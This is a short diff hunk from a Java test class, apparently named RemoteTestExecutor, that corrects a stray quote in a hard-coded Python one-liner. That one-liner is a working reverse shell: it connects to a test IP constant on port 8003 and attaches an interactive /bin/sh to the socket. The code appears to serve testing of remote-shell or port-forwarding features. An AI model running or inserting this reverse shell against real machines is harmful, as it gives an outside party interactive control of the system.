@@ -199,7 +199,7 @@ public class RemoteTestExecutor {
 	}
 	
 	private void runPython(OutputStreamWriter bw) throws IOException, InterruptedException, ExecutionException{
-		String[] command = {"python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + TestConstants.PORT_FORWARD_TEST_IP_LINUX +  "\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'"};
+		String[] command = {"python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + TestConstants.PORT_FORWARD_TEST_IP_LINUX +  "\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);"};
 		System.out.println("Running command: " + command);
 		Runnable runner2 = new Runnable() {
 			@Override
